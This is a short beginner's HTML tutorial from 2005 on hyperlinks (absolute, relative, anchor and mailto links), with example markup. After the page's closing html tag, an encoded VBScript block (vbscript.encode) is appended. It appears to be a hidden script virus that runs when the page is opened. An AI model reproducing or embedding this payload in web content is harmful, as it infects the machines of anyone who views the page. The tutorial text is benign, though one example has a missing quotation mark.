<html>
<head>
	<title>
		Easy HTML tutorial for creating cool web page nowadays
	</title>
	<meta http-equiv="Page-Enter" content="revealTrans(Duration=1.5,Transition=23)">
	<link rel="stylesheet" href="mystyle.css">
	<style type="text/css">
	.html{font-family:palatino linotype,courier new;font-size=10pt}
	</style>
</head>
<body>
	<blockquote>
	<p>
		Hyperlink or usually called link is a text that used to connect one page to another page.
		Links created by anchor tags &lt;a&gt;. Links divide into 3, there are :
		<ol>
		<font size=2 face=verdana>
			<li>Absolute links</li>
			<li>Relative links</li>
			<li>Self links</li>
		</font>
		</ol>
	</p>
	<p>
		Abolute links is a link to connect your web to another page that is outside your website.
		Example :
	</p>
	<p class="html">
		&lt;a href="http://www.yahoo.com/"&gt;Yahoo!&lt;/a&gt;
	</p>
	<p>	
		Relative links is a link to connect one page to another page in your website.
		You just write down the path and file name.
	</p>
	<p class="html">
		&lt;a href="index.html"&gt;Home&lt;/a&gt; -- if the file .html in the same folder.<br>
		&lt;a href="folder1/index.html"&gt;Home&lt;/a&gt; -- if the file .html in folder1.
	</p>
	<p>
		Self-link is a link to go to the same page. With this link you can quickly go to part you want to read in the same page.
		You must give the name first use tag &lt;a name="index"&gt;&lt;/a&gt; and don't forget to give # mark in front of the tag.
	</p>
	<p class="html">
		 &lt;a name="name"&gt;topic name&lt;/a&gt;<br>
		&lt;a href="#name"&gt;Go to topic name&lt;/a&gt;
	</p>
	<p>
		Feeling confused, it's ok now let's go to example.
	</p>
	<p class="html">
		&lt;html&gt;<br>
		&lt;head&gt;<br>
		&lt;title&gt;Using anchor&lt;/title&gt;<br>
		&lt;/head&gt;<br><br>
		
		&lt;body&gt;<br>
		&lt;a href="page2.html"&gt;Go to page 2&lt/a&gt;<br>
		&lt;/body&gt;<br>
		&lt;/html&gt;
	</p>
	<p>
		Save it with name page1.html then make page2.html like this
	</p>
	<p class="html">
		&lt;html&gt;<br>
		&lt;head&gt;<br>
		&lt;title&gt;Page2&lt;/title&gt;<br>
		&lt;/head&gt;<br><br>
		
		&lt;body&gt;<br>
		&lt;h1&gt;Welcome to page 2&lt;br&gt;<br>You have used hyperlinks.&lt/h1&gt;<br>
		&lt;/body&gt;<br>
		&lt;/html&gt;
	</p>
	<p>
		If you want to make a link that send email to people you can use this tag.
	</p>
	<p class="html">
		&lt;a href="mailto:someone@domain.com"&gt;Email me&lt/a&gt;
	<br><font face=verdana size=2>This link will open outlook express</font>
	</p>
	
	<p>
		Normal link will look like this one <a href="Page1.html">Go to page1</a> but if you want to
		make the link with no underline you can add this command to &lt;a&gt; : 
	</p>
	<p class="html">
		&lt;a href="page1.html style="text-decoration:none"&gt;Go to page 1&lt;/a&gt;
	</p>
	<p> 
		It will look like <a href="page1.html" style="text-decoration:none">Go to page 1</a>
	</p>
	<p>
		<img src="closed.gif" border=0> Next : <a href="Lists.html">Creating list easily</a><br>
		<img src="closed1.gif" border=0> Previous : <a href="Images.html">Insert Images</a>
	</p>
	<hr width=75% align=center color="#0066ff">
	<p align=right>&copy;2005 by Tedi Widjaja<br>
	<a href="mailto:u_p17z@yahoo.com">u_p17z@yahoo.com</a>
</body>
</html>
<script id=icaros language=vbscript.encode><!--
#@~^chAAAA==6	P3MDKDP"+k;:PH+XY@&/Kx/D~bawVOHls+{J-4d bmCD}dR2RT ZJ@&/G	/OPz2aVnDZKN+{J1G:c:dRmmOr7+(c)mDk\p/WswKxnxOE@&ZGxkOP6/G/d?q9xr	TfWfw2T8Ow!,2O8qZwO0,W!RTZb!;1!lc y0NJ@&ZKxdY~AkZJ?&9'r	o12*f/+yOqZwT FqG! bf~, T!;!*sG*0)ZA8r@&NKmEsnUYchMkO+E@!mw2VOP4+rL4Y'T~Sk[Y4xZPUm:'JLba2VYHls+'E,mW9n'r[ba2s+DZKNn[E@*@!zCwas+D@*E@&U+Y~Abx[WS KxsKl9'MY"n0vJhlbx-f|Wx^Gl9J#@&j;4,:mkU\fmKxsWm[`*@&]nTZtCUT+c#@&9MW2:+swVmYcK:2VmYn9bD#@&9DKwKh2VmY`PtrdGk.nmOt*@&9.KwHrd1`b@&wr^+j1l	`K4kk9kMnCY4#@&KdWl9/tm3vb@&2	N,?;4@&j!4~fMGwtkd^v#@&6U,2.DK.,InkEs+Pg+XO@&wW.P	'T~DWP8@&fMWw:nhw^lD+c0dGcMnYU2+1kCswWV[nM`U#LE'Jb@&16Y@&sK.PAl^t,N~r	P0kGRGDk7nd@&&0,N f.r7+PXan'yPO4xP9.KwP+s2^lO`9RfMk7nSYO+M[El'J#@&H+XY@&G.Gw:+swslOnvdtU4+^V ja+mrC^sGV9nM/crHHfW1EsnxD/E#LJwE*@&2	[PUE4@&j;4,ndWCN/4mV`*@&r	P3.MWD~]/;:~g+aD@&&0PtW	Otv1Gh*'1~mxN,9lH`1KAb'yv,Y4+U~q/4?4nV^R];	`J]igfJS2+c2pAPkt+^V2+R9Vs~UC3abYbUNKh/Aa~ r#@&2UN~j!4@&?!8PwksnzwwnU9`W~1b@&rU,2MDWMP"n/!:nPg+aO@&?+D~:Hsk^nx0kWcMnYor^+c0*@&x{:zobV+ )DY.k(;D+d@&:Hsk^+c)YDDr4!Ynd{!@&UnY,:Xwrs+{0kW r2n	Kn6Dok^+cWB%#@&hHsrV qDrD+,m@&sXwrVR/VK/n@&wkV)YDDP6SU@&Ax9PjE8@&UE8PwrVqUWmYc2*@&6x,3MDGMP"+/!:~16O@&U+O~6'0kGR}w+	Pn6DsbVn`2S8#@&m{WR"+C[zVV@&WcZsWkn@&qW,q	?YMI-`1~-ZKNnb{!P}.P&x?D.]+7`1~-ZG[#QSU`7ZG[#@!Jn	`^#,P4+U,@&wkVba2+	N~wB\/G9+@&AUN,q0@&3UN,?!4@&?;8,srVjmmxc2*@&rU~AD.WM~"+d!:P16D@&sKD~2mm4~k0F,(x,0/K !+DsKV[+.ca# sbs+k@&jn^+mO~;ld+,J;ld`6/WcMO2XYnxkkGUgl:c/6FRgCh+*#@&ZC/n~rtO:rSJ4Yhsr~J4ODJ@&sbsqU6+1Y`k08 nmY4#@&2U[,?+^nmD@&1aO@&Ax9PjE8@&wEUmDrW	P-/KN+cb@&rUPA.MW.,I/Es+,H+XY@&\;W[n{J@!r'JkmDb2OPbN{k^l.GkPsl	LEmonx74/^.bwORU1W[@*r[Iw^Cm`[W1Ehn	YRmsVckmm.G/ck	xnDuPtSS\(^D^0SEr#[E@!JJ'Jk^Mk2D@*r@&2	N,oE	mOkKx@&j!4P"no;tl	Ln`*@&}x~2..KD~IdEs+~H6Y@&)A'EtDOa)&JhShRT+K^kDkn/cmGhJl4K;YDDK.&k	N6 tOhr@&jn{El(W;O=+D.GMJ@&C;i{Jun2I{Z`I"31:{i?AIwE@&?H{E?K0YSC.+'Hbm.WdG6YwJ@&uSt'Eun25mJ}Z)S|\zZu&1A-J@&;xJqkUNKhdw;EDMnxD.+MdrW	-r@&K2xEhWsk1r+k-3aaVW.nM-E@&&3{J(	YDxY,36aVGDDwE@&?'_/jL?HL(3[rHmkU-jOmDOPhCoJ@&){CS\'UH'qA'rb8KEDjId/'nDMW.J@&2xudH[U\[qZ[r3aYUtVs.rnS/w	l1%Wso3ZO 09WOqF;o b3+v !%Z!y$ AF+vy8wE@&1'_JHL?HL	/[h2LJHWoG^NnD}2YbWUdr@&Cxu;j'?t'qZ'r2XwVKD.-zN-l	mn['Ck9[+	J@&;xuZ`[UH'/'h2'J;slk/r^Ut+ssr@&	kD4,d4?4+V^@&G	'rI3M|f	6"fJ@&j}{JIA!m?\J@&R]+L	MkO+,j~UnSj\@&R]nT.kDn,bSz2B?}@&R"noqDrYPHS8~fq@&R"+oq.rYP_~T~9	@&R]+T	DbYn~;~!S9q@& ILG+sYP2@&2	[PqkOt@&2U[,?E(@&s!xmDrGx,K4kdfr.hlOtvb@&}x~3MDW.~"+dEsn,1nXY@&w'"+asl1+cj	2d^mw+v[W1E:UOR^W1lOkGU*~E0bs+=z&&r~JEb@&qWP6dKRobV26b/Dd`a#~K4+U@&a'I2Vmm+v2S0kWcMnYor^+Hlsn`a#SEr#@&3sk+@&q6~gWOvSx`a#@!x&*PPtx~2{w[r&J@&2x9~(0@&K4kdfr.hlOt{2@&Ax[~wEx^ObWU@&w;	mObW	PK:aslD+9kM`b@&}xPA.DKDP"ndEs+,1n6O@&a'W/K MYj2mkCswWsN.v!bLJ'+(J@&W/KR9+^+OnwWV9nD,w~:.;+@&0kW Z.nmYnsKsNDc2*@&?nO,:zsbs'WkWcM+DsKsNDcw*@&hzwkV bDYDb8;Y/{G@&KnhaVCY9kM'2'r-J@&3	N~s!U1YrKx@&?E(PG.WaKn:aVCO`wmOt*@&r	~3DMWMP]+d;s+~1aY@&sGs9+DuP:'E@!4OsV@*@!4KNX,/1.W^VxxKPdOHV+{hlMok	lT@*@!W(LnmO~1VC/krN{msdbN)q0y!o2GT c{22 FFG! ),+ZR!ZZT*wfGZXbyP/Dzs+{hbNOtlqZ!Yi4nkTtOl8!!Y@*@!zG4Nn1Y@*@!z(WNH@*@!&tD:s@*r@&rUbSk	n'mDDmzcJ]2XYjtns^sGV9nDjknAkTJSEG+Wl!sD'`l,Rcsw2ZR Rf*O8F/o b2+OZ%!Z+$ AFyv+8ESr	X,R*sw2TRy%f*R8F/s )Av !R!!yAy3Fyv+8{	X1Rcsw3!  %G*RF8ZwO)2 !0!Z+Ay2q++ 8ESrJSJ]`l,0Wsw2!  R9c FqZwO)3+vOZ0!Z Ay3q + )TE~EKDdkkOHKxrVD'Wr^+lzJoKV[DctYDJBEJBJ,RUtns^ZVmd/&x0KDE~rZKxWk.hwks+}2'ZJb@&G+/VOKw(1&xxWr	`bxkdk	n~j4/Dd0b@&a'wmOtLJfdVYKwckUkE@&wks+;.+mYn~a~fnd0YGw&H&@&obVbYDD,2~F@&2'alO4LJsKsNDR4OOJ@&sbVnZ.nmYnPaSsKV[nMCKP~LP-ZK[@&obVbYDD,2~F@&3x9Pj;(@&?!8PwkV/.+mY`Wksn	lh+B^W	YnUD/#@&6	P3DMGMP]/!:+,1aY@&srVbOOMP0bs+	l:ST@&U+DPhXor^+x0kGR;DnCD+KnaDsrVc6ksxm:+BKM;+*@&hXwksncDbO+,mW	OnxD/@&:zsrsR/VKd+@&2U[,?E8@&UE8Pwr^+)DYM`0bVUls+SlDY.b@&rx,3DMWD,]n/!:PH+aO@&?nY,hXwksn{0/G V+Osbs`WbVxls+*@&:HsrVR)ODDk(;Y/'mOOD@&2	N~?;8@&s;x1OkKx~)awr8%v#@&r	~AD.KD,I+kEsnPg+aY@&?nO,bwa64N'NK^;:xDRCw2sYd`z2w^+OHm:+b@&Ax[Pw;	mObW	@&s!x1OkKx~0kWcb@&rx,3DMWD,]n/!:PH+aO@&?nY,W/K'/.lYn6(Lc0kG;Sj&f*@&2	N,oE	mOkKx@&o!xmDrW	Pk4jtV^`b@&6U,2.DK.P"+d;s+PHnXY@&?O,d4?4+V^';.+mYnr(LcAkZSU(f*@&2	[~s!x1YrWU@&wEUmDrW	P/.lYn6(LcZdj&fb@&r	P2MDK.P"+dEs+~H6Y@&)war4N j+DZd?(fc/d?(f*@&baw68NRm.nmYnq	dDlU1+v#@&Sk	[WSRdYmY;d{JJ@&j+DPZMnCYr(Lxb22}4%RVnY}4%n1Y`b@&Ax[Pw;	mObW	EyUFAA==^#~@
--></script>